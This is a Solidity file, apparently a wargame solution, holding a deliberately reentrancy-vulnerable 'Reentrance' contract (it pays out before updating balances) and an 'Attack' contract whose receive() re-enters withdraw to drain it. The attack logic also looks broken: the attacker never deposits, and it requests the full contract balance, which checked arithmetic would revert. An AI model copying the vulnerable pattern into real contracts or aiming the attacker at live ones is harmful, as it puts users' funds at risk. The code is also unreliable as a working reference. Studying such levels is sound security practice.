// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
        
contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Not{}

contract Attack{

  Reentrance public reentrance;

  constructor(Reentrance _contract) {
    reentrance = _contract;
  }

  function withdraw() public{
    reentrance.withdraw(1 ether);
  }

  receive() external payable {
    if(address(reentrance).balance == 0){

    }else{
      reentrance.withdraw(address(reentrance).balance);
    }
  }
}